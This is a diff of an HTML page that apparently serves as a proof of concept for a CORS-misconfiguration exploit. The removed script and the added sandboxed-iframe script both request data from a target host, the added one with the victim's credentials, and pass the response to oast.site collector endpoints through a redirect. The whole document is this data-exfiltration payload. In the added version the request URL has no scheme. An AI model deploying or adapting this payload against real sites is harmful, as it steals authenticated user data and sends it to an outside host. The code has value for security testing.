@@ -7,15 +7,16 @@
 </head>
 <body>
   <h1>Bismillah</h1>
-<script>
-  var req = new XMLHttpRequest();
-  req.onload = listener;
-  req.open('get','https://idch.kadalsfamily.com:9090/data.json',true);
-  req.send();
-  function listener() {
-    location='https://vrbkdzo9hpv711781uvx47ev8tuavjb19.oast.site?key='+this.responseText;
-  }
-</script> 
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','idch.kadalsfamily.com:9090/alinda.txt',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://5bsjh6isfdpm490vs49ihoq90cyob5orj.oast.site/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
 
 </body>
 </html>
